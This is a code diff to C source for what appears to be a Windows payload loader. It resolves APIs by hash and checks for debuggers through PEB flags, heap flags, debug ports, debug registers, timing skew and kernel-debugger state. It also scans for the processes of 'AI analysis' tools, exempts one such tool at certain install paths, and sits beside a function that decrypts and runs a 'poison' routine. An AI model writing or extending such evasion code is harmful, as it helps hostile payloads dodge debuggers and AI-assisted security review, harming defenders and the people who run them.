@@ -75,6 +75,8 @@ typedef int (__stdcall *write_file_t)(void*, const void*, uint32_t, uint32_t*, v
 typedef int (__stdcall *close_handle_t)(void*);
 typedef uint32_t (__stdcall *get_u32_t)(void);
 typedef uint64_t (__stdcall *get_u64_t)(void);
+typedef void* (__stdcall *open_process_t)(uint32_t, int, uint32_t);
+typedef int (__stdcall *query_full_process_image_name_w_t)(void*, uint32_t, uint16_t*, uint32_t*);
 
 typedef struct resolved_s {
     void* ntdll;
@@ -174,6 +176,8 @@ typedef struct resource_fixup_s {
 #define HASH_GETPID         0xc739cdb562a88e60ULL
 #define HASH_GETTID         0x91e1cbfb1d7bcb35ULL
 #define HASH_GETTICK64      0x228a6fe4178f3b37ULL
+#define HASH_OPENPROCESS    0x050d20e18d7fd1b6ULL
+#define HASH_QUERYFULLPROCESSIMAGENAMEW 0xb8858b47bc6d29e4ULL
 
 #define IMG_MAGIC           0x41504B44u
 #define IMG_VERSION_LEGACY  0x00020000u
@@ -200,6 +204,7 @@ typedef struct resource_fixup_s {
 #define APL_FILE_SHARE_ALL  0x00000007u
 #define APL_OPEN_ALWAYS     4u
 #define APL_FILE_NORMAL     0x00000080u
+#define APL_PROCESS_QUERY_LIMITED_INFORMATION 0x00001000u
 
 #define APL_EVENT_UNPACK_ENTER          0x1001u
 #define APL_EVENT_RESOLVE_FAIL          0x1002u
@@ -217,6 +222,7 @@ typedef struct resource_fixup_s {
 #define APL_EVENT_PHASE_ENTER           0x100Eu
 #define APL_EVENT_PHASE_EXIT            0x100Fu
 #define APL_EVENT_UNPACK_DONE           0x1010u
+#define APL_EVENT_ENV_CHECK             0x1011u
 #define APL_EVENT_SECTIONS_START        0x2001u
 #define APL_EVENT_SECTIONS_ALLOC_FAIL   0x2002u
 #define APL_EVENT_SECTION_ENTER         0x2003u
@@ -2565,6 +2571,84 @@ static uint32_t env_wide_basename_hash_ci(const uint16_t* w, size_t w_chars) {
     return h;
 }
 
+static void payload_log_env_check(uint32_t check_id, uint64_t status, uint64_t a, uint64_t b) {
+    payload_log_event(APL_EVENT_ENV_CHECK, ((uint64_t)check_id << 32) | (status & 0xFFFFFFFFu), a, b);
+}
+
+static int env_path_is_sep(uint16_t c) {
+    return c == (uint16_t)'\\' || c == (uint16_t)'/';
+}
+
+static int env_path_previous_component_hash(const uint16_t* path, size_t* end, size_t* start, uint32_t* hash) {
+    if (path == 0 || end == 0 || start == 0 || hash == 0) {
+        return 0;
+    }
+    size_t e = *end;
+    while (e > 0u && env_path_is_sep(path[e - 1u])) {
+        --e;
+    }
+    if (e == 0u) {
+        return 0;
+    }
+    size_t s = e;
+    while (s > 0u && !env_path_is_sep(path[s - 1u])) {
+        --s;
+    }
+    *start = s;
+    *end = s;
+    *hash = env_wide_basename_hash_ci(path + s, e - s);
+    return 1;
+}
+
+static int env_codex_path_components_allowed(const uint16_t* path, size_t chars) {
+    size_t end = chars;
+    size_t start = 0;
+    uint32_t h = 0;
+    if (!env_path_previous_component_hash(path, &end, &start, &h) || h != 0x998793BAu) {
+        return 0;
+    }
+    if (!env_path_previous_component_hash(path, &end, &start, &h) || h != 0x5ACAD8BEu) {
+        return 0;
+    }
+    if (!env_path_previous_component_hash(path, &end, &start, &h)) {
+        return 0;
+    }
+    if (h != 0xD4CDE064u) {
+        if (!env_path_previous_component_hash(path, &end, &start, &h) || h != 0x9313FE77u) {
+            return 0;
+        }
+        if (!env_path_previous_component_hash(path, &end, &start, &h) || h != 0x13473C76u) {
+            return 0;
+        }
+        if (!env_path_previous_component_hash(path, &end, &start, &h) || h != 0x28258718u) {
+            return 0;
+        }
+        if (!env_path_previous_component_hash(path, &end, &start, &h) || h != 0x0A7656C0u) {
+            return 0;
+        }
+        return 1;
+    }
+    if (!env_path_previous_component_hash(path, &end, &start, &h) || h != 0xEDE616C3u) {
+        return 0;
+    }
+    if (!env_path_previous_component_hash(path, &end, &start, &h)) {
+        return 0;
+    }
+    if (h == 0x1F2A620Cu || h == 0x653658ADu) {
+        return 1;
+    }
+    if (h != 0x8F6DB3A8u) {
+        return 0;
+    }
+    if (!env_path_previous_component_hash(path, &end, &start, &h) || h != 0x9C436708u) {
+        return 0;
+    }
+    if (!env_path_previous_component_hash(path, &end, &start, &h) || h != 0x960315F4u) {
+        return 0;
+    }
+    return 1;
+}
+
 static int env_process_name_is_trusted_aida_runtime(const uint16_t* w, size_t w_chars) {
     uint32_t h = env_wide_basename_hash_ci(w, w_chars);
     return h == 0x7C29C919u ||
@@ -2575,11 +2659,62 @@ static int env_process_name_is_trusted_aida_runtime(const uint16_t* w, size_t w_
         h == 0x68EA95D7u;
 }
 
-static int env_classify_ai_analysis_process_name(const uint16_t* w, size_t w_chars) {
+static int env_codex_image_path_allowed(const resolved_t* r, void* pid, uint64_t* path_diag) {
+    if (path_diag != 0) {
+        *path_diag = 0u;
+    }
+    if (r == 0 || pid == 0) {
+        return 0;
+    }
+    open_process_t pOpenProcess =
+        (open_process_t)payload_resolve_kernel_export(r->kernel32, r->kernelbase, HASH_OPENPROCESS);
+    query_full_process_image_name_w_t pQueryFullProcessImageNameW =
+        (query_full_process_image_name_w_t)payload_resolve_kernel_export(r->kernel32, r->kernelbase, HASH_QUERYFULLPROCESSIMAGENAMEW);
+    close_handle_t pCloseHandle =
+        (close_handle_t)payload_resolve_kernel_export(r->kernel32, r->kernelbase, HASH_CLOSEHANDLE);
+    if (pOpenProcess == 0 || pQueryFullProcessImageNameW == 0 || pCloseHandle == 0) {
+        return 0;
+    }
+    void* h = pOpenProcess(APL_PROCESS_QUERY_LIMITED_INFORMATION, 0, (uint32_t)(uintptr_t)pid);
+    if (h == 0 || h == (void*)(intptr_t)-1) {
+        return 0;
+    }
+    uint16_t path[640];
+    mem_set(path, 0, sizeof(path));
+    uint32_t chars = 639u;
+    int ok = pQueryFullProcessImageNameW(h, 0u, path, &chars);
+    pCloseHandle(h);
+    if (ok == 0 || chars == 0u || chars >= 639u) {
+        return 0;
+    }
+    uint32_t path_hash = env_wide_basename_hash_ci(path, (size_t)chars);
+    if (path_diag != 0) {
+        *path_diag = ((uint64_t)path_hash << 32) | (uint64_t)chars;
+    }
+    return env_codex_path_components_allowed(path, (size_t)chars);
+}
+
+static int env_process_name_is_allowed_developer_companion(const uint16_t* w, size_t w_chars,
+                                                           const resolved_t* r, void* pid) {
+    uint32_t h = env_wide_basename_hash_ci(w, w_chars);
+    if (h != 0x998793BAu) {
+        return 0;
+    }
+    uint64_t path_diag = 0;
+    int allowed = env_codex_image_path_allowed(r, pid, &path_diag);
+    payload_log_env_check(22u, (uint64_t)(uint32_t)allowed, path_diag, (uint64_t)(uintptr_t)pid);
+    return allowed;
+}
+
+static int env_classify_ai_analysis_process_name(const uint16_t* w, size_t w_chars,
+                                                 const resolved_t* r, void* pid) {
     if (env_process_name_is_trusted_aida_runtime(w, w_chars)) {
         return 0;
     }
     uint32_t h = env_wide_basename_hash_ci(w, w_chars);
+    if (h == 0x998793BAu && env_process_name_is_allowed_developer_companion(w, w_chars, r, pid)) {
+        return 0;
+    }
     if (h == 0x998793BAu || h == 0xBC92E353u || h == 0xC1BB2F79u ||
         h == 0xBC28162Du || h == 0x47FDA4FEu || h == 0xEE574591u ||
         h == 0x2E1CD469u || h == 0x0C1E4AAEu || h == 0x127BCA0Du ||
@@ -2670,8 +2805,12 @@ static int env_check_ai_analysis_processes(const resolved_t* r) {
             env_system_process_info_t* spi = (env_system_process_info_t*)(base + offset);
             if (spi->ImageName.Buffer != 0 && spi->ImageName.Length >= 2u && spi->ImageName.Length <= 520u) {
                 size_t chars = (size_t)spi->ImageName.Length / 2u;
-                detected = env_classify_ai_analysis_process_name(spi->ImageName.Buffer, chars);
+                detected = env_classify_ai_analysis_process_name(spi->ImageName.Buffer, chars, r, spi->UniqueProcessId);
                 if (detected != 0) {
+                    uint32_t matched_hash = env_wide_basename_hash_ci(spi->ImageName.Buffer, chars);
+                    payload_log_env_check(21u, (uint64_t)(uint32_t)detected,
+                                          ((uint64_t)matched_hash << 32) | (uint64_t)(uint32_t)chars,
+                                          (uint64_t)(uintptr_t)spi->UniqueProcessId);
                     break;
                 }
             }
@@ -2740,30 +2879,56 @@ static void env_decrypt_and_run_poison(const resolved_t* r) {
 
 static int runtime_environment_check(const resolved_t* r) {
     int ai_status = env_check_ai_analysis_processes(r);
+    payload_log_env_check(20u, (uint64_t)(uint32_t)ai_status, 0u, 0u);
     if (ai_status != 0) {
         return ai_status;
     }
-    if (env_check_peb_being_debugged()) {
+    int peb_debugged = env_check_peb_being_debugged();
+    payload_log_env_check(1u, (uint64_t)(uint32_t)peb_debugged, 0u, 0u);
+    if (peb_debugged) {
         return 1;
     }
-    if (env_check_nt_global_flag()) {
+    peb_t* peb_for_flags = get_peb();
+    uint8_t* peb_bytes = (uint8_t*)peb_for_flags;
+    uint32_t nt_global_flags = 0;
+    mem_copy(&nt_global_flags, peb_bytes + 0xBC, 4);
+    int nt_global_flag_set = (nt_global_flags & 0x70u) != 0u;
+    payload_log_env_check(2u, (uint64_t)(uint32_t)nt_global_flag_set, nt_global_flags, 0u);
+    if (nt_global_flag_set) {
         return 2;
     }
-    if (env_check_heap_flags()) {
+    void* heap_for_flags = 0;
+    mem_copy(&heap_for_flags, peb_bytes + 0x30, sizeof(void*));
+    uint32_t heap_flags = 0;
+    uint32_t heap_force_flags = 0;
+    if (heap_for_flags != 0) {
+        uint8_t* heap_bytes = (uint8_t*)heap_for_flags;
+        mem_copy(&heap_flags, heap_bytes + 0x70, 4);
+        mem_copy(&heap_force_flags, heap_bytes + 0x74, 4);
+    }
+    int heap_flag_set = heap_for_flags != 0 && (heap_force_flags != 0u || ((heap_flags & ~0x02u) != 0u));
+    payload_log_env_check(3u, (uint64_t)(uint32_t)heap_flag_set, heap_flags, heap_force_flags);
+    if (heap_flag_set) {
         return 3;
     }
     void* ntdll_local = find_module(HASH_NTDLL);
     void* kernel32_local = find_module(HASH_KERNEL32);
+    payload_log_env_check(30u,
+                          (ntdll_local != 0 && kernel32_local != 0) ? 1u : 0u,
+                          (uint64_t)(uintptr_t)ntdll_local,
+                          (uint64_t)(uintptr_t)kernel32_local);
     if (ntdll_local == 0 || kernel32_local == 0) {
         return 0;
     }
     nt_query_info_proc_t pNtQueryInformationProcess =
         (nt_query_info_proc_t)resolve_export(ntdll_local, HASH_NTQUERYINFOPROC, 0, 0, 0);
+    payload_log_env_check(31u, pNtQueryInformationProcess != 0 ? 1u : 0u, (uint64_t)(uintptr_t)pNtQueryInformationProcess, 0u);
     if (pNtQueryInformationProcess != 0) {
         uint64_t debug_port = 0;
         uint32_t ret_len = 0;
         long st1 = pNtQueryInformationProcess((void*)(intptr_t)-1, ENV_PROCESS_DEBUG_PORT,
                                               &debug_port, sizeof(debug_port), &ret_len);
+        payload_log_env_check(4u, (uint64_t)(uint32_t)st1, debug_port, ret_len);
         if (st1 >= 0 && debug_port != 0u) {
             return 4;
         }
@@ -2771,6 +2936,7 @@ static int runtime_environment_check(const resolved_t* r) {
         ret_len = 0;
         long st2 = pNtQueryInformationProcess((void*)(intptr_t)-1, ENV_PROCESS_DEBUG_OBJECT_HANDLE,
                                               &debug_object, sizeof(debug_object), &ret_len);
+        payload_log_env_check(5u, (uint64_t)(uint32_t)st2, debug_object, ret_len);
         if (st2 >= 0 && debug_object != 0u) {
             return 5;
         }
@@ -2778,15 +2944,19 @@ static int runtime_environment_check(const resolved_t* r) {
         ret_len = 0;
         long st3 = pNtQueryInformationProcess((void*)(intptr_t)-1, ENV_PROCESS_DEBUG_FLAGS,
                                               &debug_flags, sizeof(debug_flags), &ret_len);
+        payload_log_env_check(6u, (uint64_t)(uint32_t)st3, debug_flags, ret_len);
         if (st3 >= 0 && debug_flags == 0u) {
             return 6;
         }
     }
     check_remote_debugger_t pCheckRemoteDebuggerPresent =
         (check_remote_debugger_t)resolve_export(kernel32_local, HASH_CHECKREMOTEDBG, 0, 0, 0);
+    payload_log_env_check(32u, pCheckRemoteDebuggerPresent != 0 ? 1u : 0u, (uint64_t)(uintptr_t)pCheckRemoteDebuggerPresent, 0u);
     if (pCheckRemoteDebuggerPresent != 0) {
         int present = 0;
-        if (pCheckRemoteDebuggerPresent((void*)(intptr_t)-1, &present) != 0) {
+        int crdp_ok = pCheckRemoteDebuggerPresent((void*)(intptr_t)-1, &present) != 0;
+        payload_log_env_check(7u, (uint64_t)(uint32_t)crdp_ok, (uint64_t)(uint32_t)present, 0u);
+        if (crdp_ok) {
             if (present != 0) {
                 return 7;
             }
@@ -2794,35 +2964,48 @@ static int runtime_environment_check(const resolved_t* r) {
     }
     nt_get_context_thread_t pNtGetContextThread =
         (nt_get_context_thread_t)resolve_export(ntdll_local, HASH_NTGETCONTEXTTHREAD, 0, 0, 0);
+    payload_log_env_check(33u, pNtGetContextThread != 0 ? 1u : 0u, (uint64_t)(uintptr_t)pNtGetContextThread, 0u);
     if (pNtGetContextThread != 0) {
         __declspec(align(16)) env_thread_context_t ctx_local;
         mem_set(&ctx_local, 0, sizeof(ctx_local));
         ctx_local.ContextFlags = ENV_CONTEXT_DEBUG_REGISTERS;
         long st_ctx = pNtGetContextThread((void*)(intptr_t)-2, &ctx_local);
+        uint64_t dr_or = ctx_local.Dr0 | ctx_local.Dr1 | ctx_local.Dr2 | ctx_local.Dr3;
+        payload_log_env_check(8u, (uint64_t)(uint32_t)st_ctx, dr_or, ctx_local.Dr7);
         if (st_ctx >= 0) {
-            uint64_t dr_or = ctx_local.Dr0 | ctx_local.Dr1 | ctx_local.Dr2 | ctx_local.Dr3;
             if (dr_or != 0u) {
                 return 8;
             }
         }
     }
-    if (env_check_kuser_kd()) {
+    uint8_t* kuser = (uint8_t*)(uintptr_t)ENV_KUSER_SHARED_DATA;
+    int kuser_kd = kuser[ENV_KUSER_KD_DEBUGGER_ENABLED] != 0;
+    payload_log_env_check(9u, (uint64_t)(uint32_t)kuser_kd, kuser[ENV_KUSER_KD_DEBUGGER_ENABLED], 0u);
+    if (kuser_kd) {
         return 9;
     }
-    if (env_check_rdtsc_skew()) {
+    int rdtsc_skew = env_check_rdtsc_skew();
+    payload_log_env_check(10u, (uint64_t)(uint32_t)rdtsc_skew, 0u, 0u);
+    if (rdtsc_skew) {
         return 10;
     }
-    if (env_check_xcr0_consistency()) {
+    int xcr0_inconsistent = env_check_xcr0_consistency();
+    payload_log_env_check(11u, (uint64_t)(uint32_t)xcr0_inconsistent, 0u, 0u);
+    if (xcr0_inconsistent) {
         return 11;
     }
     nt_query_sys_info_t pNtQuerySystemInformation =
         (nt_query_sys_info_t)resolve_export(ntdll_local, HASH_NTQUERYSYSINFO, 0, 0, 0);
+    payload_log_env_check(34u, pNtQuerySystemInformation != 0 ? 1u : 0u, (uint64_t)(uintptr_t)pNtQuerySystemInformation, 0u);
     if (pNtQuerySystemInformation != 0) {
         sys_kernel_debugger_info_t kd_info;
         mem_set(&kd_info, 0, sizeof(kd_info));
         uint32_t ret_len = 0;
         long st_kd = pNtQuerySystemInformation(ENV_SYSTEM_KERNEL_DEBUGGER_INFORMATION,
                                                &kd_info, sizeof(kd_info), &ret_len);
+        payload_log_env_check(12u, (uint64_t)(uint32_t)st_kd,
+                              ((uint64_t)kd_info.KernelDebuggerEnabled << 32) | (uint64_t)kd_info.KernelDebuggerNotPresent,
+                              ret_len);
         if (st_kd >= 0) {
             if (kd_info.KernelDebuggerEnabled != 0u && kd_info.KernelDebuggerNotPresent == 0u) {
                 return 12;
